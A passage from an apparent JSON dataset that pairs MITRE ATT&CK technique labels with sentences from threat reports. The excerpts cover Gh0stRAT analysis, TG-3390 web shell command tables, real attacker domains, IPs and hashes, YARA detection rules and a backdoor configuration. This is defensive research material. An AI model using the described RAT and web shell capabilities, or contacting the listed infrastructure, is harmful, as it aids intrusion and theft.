      "Techniques for Analysis When I was analyzing this sample, the malware was unable to connect to its C2.\u00a0 However, I was still able to analyze the network traffic of the sample.\u00a0 How, you might ask?\u00a0 Using a hex editor and a script I wrote to encrypt text using the algorithm that this sample uses, I encrypted my own C2 address (192.168.1.108:7721) and replaced the hardcoded C2 address with my own encrypted address.\u00a0 I then opened a listener on my own IP on the respective port.\u00a0 \u00a0 [Screenshot 3] comparison of My IP (Left) vs C2 IP (Right) Next, using a debugger, I set a couple breakpoints in the Internet Communications function and ran the malware.\u00a0 The malware sample then connected to my IP and sent information to me, which I was able to observe using Wireshark.\u00a0 After I\u2019d captured the traffic, I was able to write another script to decrypt and decompress the traffic in order to view the data being sent.\u00a0 Additionally, I then wrote a socket script that detects the Gh0stRAT variant traffic, automatically decrypts the traffic, and then extracts the Implant_Opcodes for the sample.\u00a0 A second version of the script allows commands to be sent back to the malware, after I enumerated the exact command format for the sample.\u00a0  [Screenshot 4] Output of Version 1 of the script So far, the 2 opcodes that the sample has sent are 0x65 and 0x66, or Implant_Heartbeat and Implant_Login, respectively.\u00a0 \u201cHitting between the heartbeats\u201d When sending commands, first the sample must login in with 0x65, then you can send commands to it.\u00a0 However, you have to move fast as the sample will send an Implant_Heartbeat followed by an Implant_Login every 10 seconds or so, and if you try to send a command to the sample as it is responding with either opcode, it will ignore the command.\u00a0 A proof of concept of the command script can be found\u00a0here\u00a0, while the Implant extraction script and the Command Script will be included in the Appendix"
    ]
  },
  "process injection dll search order hijacking rundll32 dll side-loading input capture-multi": {
    "technique_names": [
      "process injection",
      "hijack execution flow: dll search order hijacking",
      "system binary proxy execution: rundll32",
      "hijack execution flow: dll side-loading",
      "input capture"
    ],
    "sentances": [
      "Command_Keylog_offline:\u00a0 Load into memory a dll that contains the function \u201cPluginMe\u201d.\u00a0 After researching and analyzing additional Gh0stRAT samples while trying to figure out what dll contains \u201cPluginMe\u201d, I found a DLL for keylogging (called Keylog.dll) in a Gh0stRAT 2.0 sample that exported \u201cPluginMe\u201d.\u00a0 Using that and a cross-comparison of another Gh0stRAT sample that I\u2019ve previously analyzed, I was able to determine that \u201cPluginMe\u201d is a offline keyboard manager"
    ]
  },
  "file deletion command-line interface indicator removal on host web service-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "command and scripting interpreter",
      "indicator removal on host",
      "web service"
    ],
    "sentances": [
      "Command_Update_Server:\u00a0 This command passes the string \u201cGh0st Update\u201d to the malware sample before running the sample again.\u00a0 When the sample restarts, it detects the \u201cGh0st Update\u201d command line arg, and connects to the server in order to update the sample.\u00a0 Command_Clean_Event:\u00a0 This command locates and deletes all of the event logs on the system"
    ]
  },
  "system service discovery standard application layer protocol service execution-multi": {
    "technique_names": [
      "system service discovery",
      "application layer protocol",
      "system services: service execution"
    ],
    "sentances": [
      "IOC\u2019s and YARA rules     Sample   MD5   Size   IP   IOC     TdxWCfg.exe   474b3cd073b0a40d656b1a2f5bb673cf   708KB   http://mdzz2019.noip.cn:19931   HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq \u00a0 %Program Files (x86)%/DIFXE/svchost.exe     Tdx_Dropped   9bce099b5b01c305a5d98f1fd262bce1   143.05KB   http://mdzz2019.noip.cn:19931   HKLM/System/CurrentControlSet/Services/DirecastX ytasda jrqq \u00a0     dwm.exe   00aaf0ddcc8d9b197c148e44d9e72d8d   384KB   http://mdzz2019.noip.cn:19931   HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq %Program Files (x86)%/DIFXE/svchost.exe     dwm_dropped   a548c18aa678626dab9b60628712cc18   84KB   http://mdzz2019.noip.cn:19931   HKLM/System/CurrentControlSet/Services/DirectX yta jsdrq \u00a0     \u00a0 Yara Rules:     rule gh0strat_variant_dropper   \u00a0     \u00a0   {     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 meta:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 author = \"James Quinn, @lazyactivist192\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 desc = \"Identifies a Gh0stRAT dropper\"     \u00a0    \u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 strings:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s1 = \"+gPp6bGvrqa9/fz2770A/amupqawrp8=\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s2 = \"Shellex\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s3 = \"SUSRAIZCqllahrCohrlojSarZSalpecasZ\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s4 = \"[printto(\\\"%1\\\",\\\"%2\\\",\\\"%3\\\",\\\"%4\\\")]\"     \u00a0    \u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s6 = \"SYST%-\\\\#urrENt#ONtrOLSEt\\\\SErvICEs\\\\\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 condition:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 2 of ($s1, $s2, $s4) and 1 of ($s3, $s6)     \u00a0   }     \u00a0   rule gh0strat_variant     \u00a0   {     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 meta:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 author = \"James Quinn, @lazyactivist192\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 desc = \"Identifies a Gh0stRAT variant\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 strings:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s1 = \"\\\\\\\\.\\\\agmkis2\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s2 = \"Shellex\"     \u00a0   \u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s3 = \"Gh0st Update\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 $s4 = \"PluginMe\"     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 condition:     \u00a0   \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 all of them     \u00a0   }     Appendix  Socket script Version 1: https://github.com/Jquinn147/Analysis-Automation/blob/master/Python/Gh0stRAT_Variant_Socket.py Socket Script V2(Command Script): https://github.com/Jquinn147/Analysis-Automation/blob/master/Python/Gh0stRatSocket.py Citations: Martin, D"
    ]
  },
  "command-line interface web shell-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "server software component: web shell"
    ],
    "sentances": [
      "(Source: Dell SecureWorks)  ChinaChopper web shell \u2014 A web-based executable script (see Figure 4) that allows a threat actor to execute commands on the compromised system",
      "The server-side component provides a simple graphical user interface for threat actors interacting with web shells",
      "(Source: Dell SecureWorks)   The following tools appear to be exclusive to TG-3390:  OwaAuth web shell \u2014 A web shell and credential stealer deployed to Microsoft Exchange servers",
      "Like the ChinaChopper web shell, the OwaAuth web shell requires a password",
      "TG-3390 actors keep track of and leverage existing ASPXTool web shells in their operations, preferring to issue commands via an internally accessible web shell rather than HttpBrowser or PlugX",
      "(Source: Dell SecureWorks) Appendix C \u2014 OwaAuth web shell analysis OwaAuth is a web shell that is installed as an ISAPI filter on Exchange servers and shares characteristics with the ChinaChopper web shell",
      "(Source: Dell SecureWorks) Table 4 lists the OwaAuth web shell commands available to the adversary"
    ]
  },
  "connection proxy command-line interface web shell-multi": {
    "technique_names": [
      "proxy",
      "command and scripting interpreter",
      "server software component: web shell"
    ],
    "sentances": [
      "In other cases, threat actors placed web shells on externally accessible servers, sometimes behind a reverse proxy, to execute commands on the compromised system"
    ]
  },
  "code signing proxy-multi": {
    "technique_names": ["subvert trust controls: code signing", "proxy"],
    "sentances": [
      "Newer HttpBrowser versions use SSL with self-signed certificates to encrypt network communications"
    ]
  },
  "custom cryptographic protocol system network configuration discovery-multi": {
    "technique_names": [
      "encrypted channel",
      "system network configuration discovery"
    ],
    "sentances": [
      "TG-3390 actors frequently change the C2 domain's A record to point to the loopback IP address 127.0.0.1, which is a variation of a technique known as \"parking.\" Other variations of parking point the IP address to Google's recursive name server 8.8.8.8, an address belonging to Confluence, or to other non-routable addresses"
    ]
  },
  "system information discovery file and directory discovery-multi": {
    "technique_names": [
      "system information discovery",
      "file and directory discovery"
    ],
    "sentances": [
      "As shown in Figure 11, after compromising an initial victim's system (patient 0), the threat actors use the Baidu search engine to search for the victim's organization name"
    ]
  },
  "scheduled task command-line interface-multi": {
    "technique_names": [
      "scheduled task/job",
      "command and scripting interpreter"
    ],
    "sentances": [
      "TG-3390 actors favor At.exe to create scheduled tasks for executing commands on remote systems"
    ]
  },
  "system owner/user discovery web shell-multi": {
    "technique_names": [
      "system owner/user discovery",
      "server software component: web shell"
    ],
    "sentances": [
      "Team member or team identifier Analysis of the OwaAuth web shell revealed a PDB string with the \"SyberSpace\" username (see Figure 20)"
    ]
  },
  "permission groups discovery spearphishing link custom cryptographic protocol masquerading binary padding system network configuration discovery registry run keys / startup folder exfiltration over alternative protocol pass the hash commonly used port-multi": {
    "technique_names": [
      "permission groups discovery",
      "phishing: spearphishing link",
      "encrypted channel",
      "masquerading",
      "obfuscated files or information: binary padding",
      "system network configuration discovery",
      "boot or logon autostart execution: registry run keys / startup folder",
      "exfiltration over alternative protocol",
      "use alternate authentication material: pass the hash",
      "non-standard port"
    ],
    "sentances": [
      "Indicator Type Context   american.blackcmd.com Domain name TG-3390 infrastructure Confidence: High   api.apigmail.com Domain name TG-3390 infrastructure Confidence: High   apigmail.com Domain name TG-3390 infrastructure  Confidence: High   backup.darkhero.org Domain name TG-3390 infrastructure  Confidence: High   bel.updatawindows.com Domain name TG-3390 infrastructure  Confidence: High   binary.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   castle.blackcmd.com Domain name TG-3390 infrastructure Confidence: High   ctcb.blackcmd.com Domain name TG-3390 infrastructure Confidence: High   darkhero.org Domain name TG-3390 infrastructure Confidence: High   dav.local-test.com Domain name TG-3390 infrastructure  Confidence: High   test.local-test.com Domain name TG-3390 infrastructure Confidence: High   dev.local-test.com Domain name TG-3390 infrastructure  Confidence: High   ocean.local-test.com Domain name TG-3390 infrastructure  Confidence: High   ga.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   helpdesk.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   helpdesk.csc-na.com Domain name TG-3390 infrastructure  Confidence: High   helpdesk.hotmail-onlines.com Domain name TG-3390 infrastructure  Confidence: High   helpdesk.lnip.org Domain name TG-3390 infrastructure  Confidence: High   hotmail-onlines.com Domain name TG-3390 infrastructure Confidence: High   jobs.hotmail-onlines.com Domain name TG-3390 infrastructure  Confidence: High   justufogame.com Domain name TG-3390 infrastructure  Confidence: High   lnip.org Domain name TG-3390 infrastructure Confidence: High   local-test.com Domain name TG-3390 infrastructure  Confidence: High   login.hansoftupdate.com Domain name TG-3390 infrastructure  Confidence: High   long.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   longlong.update-onlines.org Domain name TG-3390 infrastructure Confidence: High   longshadow.dyndns.org Domain name TG-3390 infrastructure  Confidence: High   longshadow.update-onlines.org Domain name TG-3390 infrastructure Confidence: High   longykcai.update-onlines.org Domain name TG-3390 infrastructure Confidence: High   lostself.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   mac.navydocument.com Domain name TG-3390 infrastructure  Confidence: High   mail.csc-na.com Domain name TG-3390 infrastructure Confidence: High   mantech.updatawindows.com Domain name TG-3390 infrastructure  Confidence: High    micr0soft.org Domain name TG-3390 infrastructure  Confidence: High    microsoft-outlook.org Domain name TG-3390 infrastructure  Confidence: High    mtc.navydocument.com Domain name TG-3390 infrastructure  Confidence: High    navydocument.com Domain name TG-3390 infrastructure  Confidence: High    mtc.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High    news.hotmail-onlines.com Domain name TG-3390 infrastructure  Confidence: High   oac.3322.org Domain name TG-3390 infrastructure  Confidence: High   ocean.apigmail.com Domain name TG-3390 infrastructure  Confidence: High   pchomeserver.com Domain name TG-3390 infrastructure  Confidence: High   registre.organiccrap.com Domain name TG-3390 infrastructure  Confidence: High   security.pomsys.org Domain name TG-3390 infrastructure  Confidence: High   services.darkhero.org Domain name TG-3390 infrastructure  Confidence: High   sgl.updatawindows.com Domain name TG-3390 infrastructure  Confidence: High   shadow.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   sonoco.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   test.logmastre.com Domain name TG-3390 infrastructure Confidence: High   up.gtalklite.com Domain name TG-3390 infrastructure  Confidence: High   updatawindows.com Domain name TG-3390 infrastructure  Confidence: High   update-onlines.org Domain name TG-3390 infrastructure Confidence: High   update.deepsoftupdate.com Domain name TG-3390 infrastructure  Confidence: High   update.hancominc.com Domain name TG-3390 infrastructure  Confidence: High   update.micr0soft.org Domain name TG-3390 infrastructure Confidence: High   update.pchomeserver.com Domain name TG-3390 infrastructure  Confidence: High   urs.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   wang.darkhero.org Domain name TG-3390 infrastructure  Confidence: High   webs.local-test.com Domain name TG-3390 infrastructure Confidence: High   word.apigmail.com Domain name TG-3390 infrastructure  Confidence: High   wordpress.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   working.blackcmd.com Domain name TG-3390 infrastructure  Confidence: High   working.darkhero.org Domain name TG-3390 infrastructure  Confidence: High   working.hotmail-onlines.com Domain name TG-3390 infrastructure Confidence: High   www.trendmicro-update.org Domain name TG-3390 infrastructure  Confidence: High   www.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   x.apigmail.com Domain name TG-3390 infrastructure  Confidence: High   ykcai.update-onlines.org Domain name TG-3390 infrastructure  Confidence: High   ykcailostself.dyndns-free.com Domain name TG-3390 infrastructure  Confidence: High   ykcainobody.dyndns.org Domain name TG-3390 infrastructure  Confidence: High   zj.blackcmd.com Domain name TG-3390 infrastructure Confidence: High   laxness-lab.com Domain name TG-3390 infrastructure  Confidence: High   google-ana1ytics.com Domain name TG-3390 infrastructure  Confidence: High   www.google-ana1ytics.com Domain name TG-3390 infrastructure  Confidence: High   ftp.google-ana1ytics.com Domain name TG-3390 infrastructure  Confidence: High   hotmailcontact.net Domain name TG-3390 infrastructure  Confidence: High   208.115.242.36 IP address TG-3390 infrastructure  Confidence: High   208.115.242.37 IP address TG-3390 infrastructure Confidence: High   208.115.242.38 IP address TG-3390 infrastructure  Confidence: High   66.63.178.142 IP address TG-3390 infrastructure  Confidence: High   72.11.148.220 IP address TG-3390 infrastructure  Confidence: High   72.11.141.133 IP address TG-3390 infrastructure  Confidence: High   74.63.195.236 IP address TG-3390 infrastructure  Confidence: High   74.63.195.236 IP address TG-3390 infrastructure  Confidence: High   74.63.195.237 IP address TG-3390 infrastructure Confidence: High   74.63.195.238 IP address TG-3390 infrastructure Confidence: High   103.24.0.142 IP address TG-3390 infrastructure Confidence: High   103.24.1.54 IP address TG-3390 infrastructure  Confidence: High   106.187.45.162 IP address TG-3390 infrastructure Confidence: High   192.151.236.138 IP address TG-3390 infrastructure Confidence: High   192.161.61.19 IP address TG-3390 infrastructure Confidence: High   192.161.61.20 IP address TG-3390 infrastructure Confidence: High   192.161.61.22 IP address TG-3390 infrastructure Confidence: High   103.24.1.54 IP address TG-3390 infrastructure Confidence: High   67.215.232.179 IP address TG-3390 infrastructure Confidence: High   96.44.177.195 IP address TG-3390 infrastructure Confidence: High   49.143.192.221 IP address TG-3390 infrastructure Confidence: Moderate   67.215.232.181 IP address TG-3390 infrastructure Confidence: Moderate   67.215.232.182 IP address TG-3390 infrastructure Confidence: Moderate   96.44.182.243 IP address TG-3390 infrastructure Confidence: Moderate   96.44.182.245 IP address TG-3390 infrastructure Confidence: Moderate   96.44.182.246 IP address TG-3390 infrastructure Confidence: Moderate   49.143.205.30 IP address TG-3390 infrastructure Confidence: Moderate   working_success@163.com Email address TG-3390 email address Confidence: High   ykcaihyl@163.com Email address TG-3390 email address Confidence: High   working_success@163.com Email address TG-3390 email address Confidence: High   yuming@yinsibaohu.aliyun.com Email address TG-3390 email address Confidence: Low   1cb4b74e9d030afbb18accf6ee2bfca1 MD5 hash HttpBrowser RAT dropper   b333b5d541a0488f4e710ae97c46d9c2 MD5 hash HttpBrowser RAT dropper   86a05dcffe87caf7099dda44d9ec6b48 MD5 hash HttpBrowser RAT dropper   93e40da0bd78bebe5e1b98c6324e9b5b MD5 hash HttpBrowser RAT dropper   f43d9c3e17e8480a36a62ef869212419 MD5 hash HttpBrowser RAT dropper   57e85fc30502a925ffed16082718ec6c MD5 hash HttpBrowser RAT dropper   4251aaf38a485b08d5562c6066370f09 MD5 hash HttpBrowser RAT dropper   bbfd1e703f55ce779b536b5646a0cdc1 MD5 hash HttpBrowser RAT dropper   12a522cb96700c82dc964197adb57ddf MD5 hash HttpBrowser RAT dropper   728e5700a401498d91fb83159beec834 MD5 hash HttpBrowser RAT dropper   2bec1860499aae1dbcc92f48b276f998 MD5 hash HttpBrowser RAT dropper   014122d7851fa8bf4070a8fc2acd5dc5 MD5 hash HttpBrowser RAT   0ae996b31a2c3ed3f0bc14c7a96bea38 MD5 hash HttpBrowser RAT   1a76681986f99b216d5c0f17ccff2a12 MD5 hash HttpBrowser RAT   380c02b1fd93eb22028862117a2f19e3 MD5 hash HttpBrowser RAT   40a9a22da928cbb70df48d5a3106d887 MD5 hash HttpBrowser RAT   46cf2f9b4a4c35b62a32f28ac847c575 MD5 hash HttpBrowser RAT   5436c3469cb1d87ea404e8989b28758d MD5 hash HttpBrowser RAT   692cecc94ac440ec673dc69f37bc0409 MD5 hash HttpBrowser RAT   6a39a4e9933407aef31fdc3dfa2a2a95 MD5 hash HttpBrowser RAT   8b4ed3b392ee5da139c16b8bca38ea5e MD5 hash HttpBrowser RAT   8ea5d8bb6b28191e4436456c35477e39 MD5 hash HttpBrowser RAT   9271bcfbba056c8f80c7f04d72efd62d MD5 hash HttpBrowser RAT   996843b55a7c5c7a36e8c6956e599610 MD5 hash HttpBrowser RAT   a554efc889714c70e9362bdc81fadd6a MD5 hash HttpBrowser RAT   c9c93c2d62a084031872aab96202ee3e MD5 hash HttpBrowser RAT   ddbdf0efdf26e0c267ef6155edb0e6b8 MD5 hash HttpBrowser RAT   e7df18a17d8e7c2ed541a57020444068 MD5 hash HttpBrowser RAT   ea4dcafc224f604c096032dde33a1d6d MD5 hash HttpBrowser RAT   f658bb17d69912404f34532901edad0e MD5 hash HttpBrowser RAT   f869a1b40f6438dfdd89e73480103211 MD5 hash HttpBrowser RAT   81ed752590752016cb1c12f3e9ab3454 MD5 hash HttpBrowser RAT   5ef719f8aeb9bf97beb24a5c2ed19173 MD5 hash HttpBrowser RAT   7ec91768376324be2bad4fd30b1c2051 MD5 hash HttpBrowser RAT   20c446ad2d7d1586138b493ecddfbbc7 MD5 hash HttpBrowser RAT   44cf0793e05ba843dd53bbc7020e0f1c MD5 hash HttpBrowser RAT   02826bb6636337963cc5162e6f87745e MD5 hash HttpBrowser RAT   1606ab7a54735af654ee6deb7427f652 MD5 hash HttpBrowser RAT   1539b3a5921203f0e2b6c05d692ffa27 MD5 hash HttpBrowser RAT   c66e09429ad6669321e5c69b1d78c082 MD5 hash HttpBrowser RAT   225e10e362eeee15ec64246ac021f4d6 MD5 hash HttpBrowser RAT   a631fc7c45cbdf80992b9d730df0ff51 MD5 hash HttpBrowser RAT   af785b4df71da0786bcae233e55cf6c1 MD5 hash HttpBrowser RAT   e3e0f3ad4ff3b981b513cc66b37583e8 MD5 hash HttpBrowser RAT   5cd0e97a1f09001af5213462aa3f7eb1 MD5 hash HttpBrowser RAT   15fd9c04d6099273a9acf8feab81acfe MD5 hash HttpBrowser RAT   ea8b9e0bf95fc0c71694310cb685cd3b MD5 hash HttpBrowser RAT   5c3ab475be110ec59257617ee1388e01 MD5 hash HttpBrowser RAT   6aac7417ea1eb60a869597af9049b8fa MD5 hash HttpBrowser RAT   372f5370085a63f5b660fab635ce6cd7 MD5 hash HttpBrowser RAT   fac4885324cb67bd421d6250fdc9533c MD5 hash HttpBrowser RAT   e7e555615a07040bb5dbe9ce59ac5d11 MD5 hash HttpBrowser RAT   ff34cb1d90d76a656546293e879afe22 MD5 hash HttpBrowser RAT   2abf7421c34c60d48e09325a206e720e MD5 Hash HttpBrowser RAT   396b4317db07cc8a2480786160b33044 MD5 hash HttpBrowser RAT   e404873d3fcd0268db10657b53bdab64 MD5 hash HttpBrowser RAT   6e4189b20adb253b3c1ad7f8fdc95009 MD5 hash HttpBrowser RAT   bff424289c38d389a8cafb16b47dfe39 MD5 hash HttpBrowser RAT   7294c7f3860315d51f74152e8ad353df MD5 hash HttpBrowser RAT   40092f76fea082b05e9631d91975a401 MD5 hash HttpBrowser RAT   e42fce74bbd637c35320cf4e95f5e055 MD5 hash HttpBrowser RAT   d0dafc3716a0d0ce393cde30b2b14a07 MD5 hash HttpBrowser RAT   ae66bad0c7de88ab0ab1050c4bec9095 MD5 hash HttpBrowser RAT   c7c2be1cd3780b2ba4638cef9a5422c7 MD5 hash HttpBrowser RAT   405949955b1cb65673c16bf7c8da2f4d MD5 hash HttpBrowser RAT   ff4f052dbe73a81403df5e98313000fb MD5 hash HttpBrowser RAT   b30fcd362c7b8ac75b7dddfe6cb448c7 MD5 hash HttpBrowser RAT   1d24f4d20b80562de46a8ac95d0ff8c2 MD5 hash HttpBrowser RAT   9538bbdb3a73201b40296e9d4dc80ade MD5 hash HttpBrowser RAT   46bb2caeda30c09a6337fd46ec98c32c MD5 hash HttpBrowser RAT   0c8842e48e80643d91dd290d0f786147 MD5 hash HttpBrowser RAT   0fc975c3c4e6c546b4f2b5aaed50dd78 MD5 hash HttpBrowser RAT   41be449f687828466ed7d87f0f30a278 MD5 hash HttpBrowser RAT   2b95caf3307ebd36cf405b1133b30aa8 MD5 hash HttpBrowser RAT   ccc715a4d9d0157b9776deacdb26bf78 MD5 hash HttpBrowser RAT   37933acfa8d8e78c54413d88ca705e17 MD5 hash HttpBrowser RAT   2813c5a1c87f7e3d33174fed8b0988a1 MD5 hash HttpBrowser RAT   8f22834efe52ccefb17e768569eb36b9 MD5 hash HttpBrowser RAT   6f01628a0b5de757a8dbe99020499d10 MD5 hash HttpBrowser RAT   7f8d9f12f41156512b60ab17f8d85fe9 MD5 hash HttpBrowser RAT   debe5ef2868b212f4251c58be1687660 MD5 hash HttpBrowser RAT   e136d4ebab357fd19df8afe221460571 MD5 hash HttpBrowser RAT   a86a906cfafaf1d7e3725bb0161b0cfe MD5 hash HttpBrowser RAT   03e1eac3512a726da30fff41dbc26039 MD5 hash HttpBrowser RAT   baac5e5dd3ce7dae56cab6d3dac14e15 MD5 hash HttpBrowser RAT   0f7dde31fbeb5ddbb6230c401ed41561 MD5 hash HttpBrowser RAT   36d957f6058f954541450f5a85b28d4b MD5 hash HttpBrowser RAT   42d874f91145bd2ddf818735346022d8 MD5 hash HttpBrowser RAT   3468034fc3ac65c60a1f1231e3c45107 MD5 hash HttpBrowser RAT   4e3b51a6a18bdb770fc38650a70b1883 MD5 hash HttpBrowser RAT   3647068230839f9cadf0fd4bd82ade84 MD5 hash HttpBrowser RAT   550922107d18aa4caad0267997709ee5 MD5 hash HttpBrowser RAT   d8f0a6450f9df637daade521dc90d29d MD5 hash HttpBrowser RAT   bf2e2283b19b0febc4bd1f47aa82a94c MD5 hash HttpBrowser RAT   d0eec2294a70ceff84ca8d0ed7939fb5 MD5 hash HttpBrowser RAT   e91d2464c8767552036dd0294fc7e6fb MD5 hash HttpBrowser RAT   f627bc2db3cab34d97c8949931cb432d MD5 hash HttpBrowser RAT   b313bbe17bd5ee9c00acff3bfccdb48a MD5 hash PlugX RAT dropper   f7a842eb1364d1269b40a344510068e8 MD5 hash PlugX RAT dropper   8dacca7dd24844935fcd34e6c9609416 MD5 hash PlugX RAT dropper   7cffd679599fb8579abae8f32ce49026 MD5 hash PlugX RAT dropper   462fd01302bc40624a44b7960d2894cd MD5 hash PlugX RAT dropper    Table 1"
    ]
  },
  "exfiltration over command and control channel remote file copy-multi": {
    "technique_names": [
      "exfiltration over c2 channel",
      "ingress tool transfer"
    ],
    "sentances": [
      "Command Functionality   Init Create a reverse shell   Write Write a file to the compromised system from the C2 server   List List the files in a directory   Upload Upload a file from the compromised system to the C2 server    Table 2"
    ]
  },
  "timestomp masquerading file and directory discovery data staged registry run keys / startup folder-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "masquerading",
      "file and directory discovery",
      "data staged",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "Command Functionality   A List logical drives   B List directory (Z1 = directory name to list)   C Read data from file (Z1 = filename to read)   D Write content to file (Z1 = filename to write, Z2 = content to write)   E Delete file in directory (Z1 = file)   F Generate custom web response \"->|value in Z1|<-\"   G Write hex-encoded content to file (Z1 = filename to write, Z2 = hex encoded content to write)   H Call _Notice(Z1, Z2)   I Move/rename file or directory (Z1 = target, Z2 = new name)   J Create directory (Z1 = directory name)   K Timestomp file or directory (Z1 = target, Z2 = time/date string to stomp to)   L Download file from Internet (Z1 = URL, Z2 = filename to write to)   M Launch process (Z1 = process name, Z2 = arguments)   N Test connect to SQL database (Z1 = SqlConnect String)   O SQL Get database table scheme (Z1 = \\r delimited parameters to command)   P SQL Get database table scheme with restrictions (Z1 = \\r delimited parameters to command)   Q SQL execute SQL command (Z1 = \\r delimited parameters to command)    Table 4"
    ]
  },
  "deobfuscate/decode files or information obfuscated files or information commonly used port-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "obfuscated files or information",
      "non-standard port"
    ],
    "sentances": [
      "Encrypted backdoor configuration    Description Decryption Strings   Check code MDDEFGEGETGIZ   Addr1: tel.qpoe[.]com   Addr2: elderscrolls.wikaba[.]com   Addr3: tel.qpoe[.]com   Port1: 443   Port2: 443   Port3: 53   LoginPasswd: someone   HostMark: mark   Proxy: 0    Figure 12"
    ]
  },
  "indicator removal on host system time discovery-multi": {
    "technique_names": ["indicator removal on host", "system time discovery"],
    "sentances": [
      "This log contains the external IP, the geographic location, the machine name, the time the machine was infected, as well as fields to be logged in the threat actor\u2019s database"
    ]
  },
  "regsvr32 registry run keys / startup folder-multi": {
    "technique_names": [
      "system binary proxy execution: regsvr32",
      "boot or logon autostart execution: registry run keys / startup folder"
    ],
    "sentances": [
      "19-2 A startup event for persistence The malware will run 2 .dlls from regsvr32 simultaneously, spawning userinit, ctfmon, and svchost processes"
    ]
  },
  "unsecured credentials: credentials in files": [
    "To ensure its victim will use IE, it will terminate any process in-focus that is Chrome or Firefox, in hopes the victim will believe the browsers are \u201cmalfunctioning.\u201d Whenever a victim uses IE and browses to specific Brazilian banks or businesses, the malware will only then begin to log keystrokes",
    "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)"
  ],
  "deobfuscate/decode files or information data compressed-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "archive collected data"
    ],
    "sentances": [
      "22 Keylogging and exfiltrating data The exfiltrated data is base64 that decodes into more custom encoded strings that appear to be \u201c/\u201d delimited"
    ]
  },
  "process discovery commonly used port-multi": {
    "technique_names": ["process discovery", "non-standard port"],
    "sentances": [
      "The frequent checking ensures that any changes made will be quickly followed, and the repeated attempts to run the Revenge RAT binary make it almost certain that even if the process is terminated, the RAT will be running again soon"
    ]
  },
  "exfiltration over command and control channel-multi": {
    "technique_names": ["exfiltration over c2 channel"],
    "sentances": [
      "We are still analyzing this Trojan to determine the specific structure of the data sent between the Trojan and the C2 server; however, it does appear that the Trojan is using the RC4 algorithm to encrypt data sent to the C2 server within HTTP POST requests"
    ]
  },
  "standard application layer protocol file and directory discovery-multi": {
    "technique_names": [
      "application layer protocol",
      "file and directory discovery"
    ],
    "sentances": [
      "When generating the URL for the HTTP requests issued to the C2 server, the Trojan chooses a random folder from the following to include within the URL path: watch/? search/? find/? results/? open/? search/? close/? XAgent also will choose several parameters names from the following list when finishing the construction of the C2 URL: itwm= text= from="
    ]
  },
  "custom cryptographic protocol obfuscated files or information data encoding-multi": {
    "technique_names": [
      "encrypted channel",
      "obfuscated files or information",
      "data encoding"
    ],
    "sentances": [
